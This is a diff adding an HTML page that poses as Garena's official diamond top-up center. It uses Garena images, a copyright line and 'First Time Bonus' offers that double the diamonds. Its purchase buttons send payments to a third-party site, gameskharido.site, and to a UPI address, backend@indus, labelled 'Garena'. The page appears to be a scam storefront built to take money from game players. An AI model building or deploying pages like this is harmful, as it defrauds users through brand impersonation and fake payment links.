@@ -1,1 +1,195 @@
 
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" href="https://html-generator.com/uploads/images/2024/10/29/40159MQ98O520WK.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Garena Topup Center</title>
+  
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  
+  <!-- Custom CSS -->
+  <style>
+    h5 { font-size: 10px; }
+    h6 { font-size: 15px; }
+    button { height: 40px; width: 100%; background-color: rgb(199, 2, 61); color: white; }
+    yellow { color: rgb(225, 196, 0); }
+    sup { font-size: 10px; color: rgb(225, 196, 0); }
+    .gh { position: relative; min-height: 300px; }
+    ul { padding-bottom: 2.5rem; }
+    #item-list, #footer { display: none; } 
+  </style>
+  
+  <!-- jQuery and Bootstrap JS -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
+  
+  <script>
+    // Function to show items and hide the form
+    function showItems() {
+      const playerId = document.getElementById("player-id").value;
+      if (playerId) {
+        document.getElementById("item-list").style.display = "block"; // Show item list
+        document.getElementById("player-form").style.display = "none"; // Hide form
+        document.getElementById("footer").style.display = "block"; // Show footer
+
+        
+      } else {
+        alert("Please enter your Player ID");
+      }
+    }
+
+    // Function to handle logout
+    function logout() {
+      document.getElementById("player-id").value = ''; // Reset input
+      document.getElementById("item-list").style.display = "none"; // Hide item list
+      document.getElementById("player-form").style.display = "block"; // Show form
+      document.getElementById("footer").style.display = "none"; // Hide footer
+    }
+
+    // Function to initialize the page state
+    function init() {
+      document.getElementById("item-list").style.display = "none"; // Hide item list on initial load
+      document.getElementById("footer").style.display = "none"; // Hide footer on initial load
+    }
+
+    // Call init on page load
+    window.onload = init;
+  </script>
+</head>
+
+<body>
+  <div>
+    <input type="image" src="https://html-generator.com/uploads/images/2024/10/29/21418CVBRQBLD7K.png" alt="" width="100%" height="60px"/>
+  </div>
+  
+  <br>
+  
+  <!-- Player ID Form -->
+  <div class="container" id="player-form">
+    <label for="player-id">Enter Player ID:</label>
+    <input type="tel" id="player-id" class="form-control mb-3" placeholder="Enter your Player ID here" required>
+    <button onclick="showItems()" class="btn">Login</button>
+  </div>
+
+  <!-- List Group of Items (hidden by default) -->
+  <ul id="item-list" class="list-group">
+    <li class="list-group-item">Pay Using UPI</li>
+    
+    <!-- Example Item -->
+    <style>
+      .bonus-box {
+        display: inline-block;
+        padding: 2px 8px;
+        background-color: #fff8dc; /* Light yellow background */
+        color: #ffdd00; /* Yellow text color */
+        border: 1px solid #ffdd00; /* Yellow border */
+        border-radius: 4px;
+        font-weight: normal; /* Remove bold */
+        font-size: 0.9em; /* Slightly smaller font size */
+      }
+    </style>
+    
+    <li class="list-group-item">
+      <div class="row">
+        <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" height="40"/>
+        <div class="col">
+          <h5>Diamond</h5>
+          <h6>100 <span class="bonus-box">+100 First Time Bonus</span><sup></sup></h6>
+        </div>
+        <a href="https://gameskharido.site/payments/80" class="upi-link" data-base-url="#" data-item-name="100+Diamond">
+          <button type="button" class="btn btn-outline-secondary">₹80</button>
+        </a>
+      </div>
+    </li>
+    
+    <li class="list-group-item">
+      <div class="row">
+        <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" height="40"/>
+        <div class="col">
+          <h5>Diamond</h5>
+          <h6>310 <span class="bonus-box">+310 First Time Bonus</span><sup></sup></h6>
+        </div>
+        <a href="https://gameskharido.site/payments/240" class="upi-link" data-base-url="#" data-item-name="310+Diamond">
+          <button type="button" class="btn btn-outline-secondary">₹240</button>
+        </a>
+      </div>
+    </li>
+    
+    <li class="list-group-item">
+      <div class="row">
+        <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" height="40"/>
+        <div class="col">
+          <h5>Diamond</h5>
+          <h6>520 <span class="bonus-box">+520 First Time Bonus</span><sup></sup></h6>
+        </div>
+        <a href="https://gameskharido.site/payments/400" class="upi-link" data-base-url="#" data-item-name="520+Diamond">
+          <button type="button" class="btn btn-outline-secondary">₹400</button>
+        </a>
+      </div>
+    </li>
+    
+    <li class="list-group-item">
+      <div class="row">
+        <img src="https://gameskharido.site/payments/800" height="40"/>
+        <div class="col">
+          <h5>Diamond</h5>
+          <h6>1060 <span class="bonus-box">+1060 First Time Bonus</span><sup></sup></h6>
+        </div>
+        <a href="upi://pay?pa=backend@indus&pn=Garena&am=800&cu=INR" class="upi-link" data-base-url="#" data-item-name="1060+Diamond">
+          <button type="button" class="btn btn-outline-secondary">₹800</button>
+        </a>
+      </div>
+    </li>
+    
+    <li class="list-group-item">
+      <div class="row">
+        <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" height="40"/>
+        <div class="col">
+          <h5>Diamond</h5>
+          <h6>2180 <span class="bonus-box">+2180 First Time Bonus</span><sup></sup></h6>
+        </div>
+        <a href="https://gameskharido.site/payments/1600" class="upi-link" data-base-url="#" data-item-name="2180+Diamond">
+          <button type="button" class="btn btn-outline-secondary">₹1,600</button>
+        </a>
+      </div>
+    </li>
+    
+    <li class="list-group-item">
+      <div class="row">
+        <img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/point.png" height="40"/>
+        <div class="col">
+          <h5>Diamond</h5>
+          <h6>5600 <span class="bonus-box">+5600 First Time Bonus</span><sup></sup></h6>
+        </div>
+        <a href="https://gameskharido.site/payments/4000" class="upi-link" data-base-url="#" data-item-name="5600+Diamond">
+          <button type="button" class="btn btn-outline-secondary">₹4,000</button>
+        </a>
+      </div>
+    </li>
+    
+      
+      
+      
+    
+    <!-- More items with similar structure -->
+    <!-- Repeat similar list items with unique "data-item-name" attributes for each -->
+  </ul>
+
+  <!-- Footer -->
+  <footer id="footer" class="page-footer font-small blue text-center py-3">
+    <a href="#" style="color:gray; padding:15px;">Customer Support</a>
+    <a href="#" onclick="logout()"><button style="width: 70px; height:27px;" class="btn btn-outline-secondary">Logout</button></a>
+    <hr>
+    <a href="#" style="color:gray; padding:15px;">All rights reserved © Garena Online</a>
+    <br>
+    <a href="#" style="color:gray; padding:15px;">FAQ</a>
+    <a href="#" style="color:gray; padding:15px;">Terms and Conditions</a>
+    <a href="#" style="color:gray; padding:5px;">Privacy Policy</a>
+  </footer>
+</body>
+</html>
+
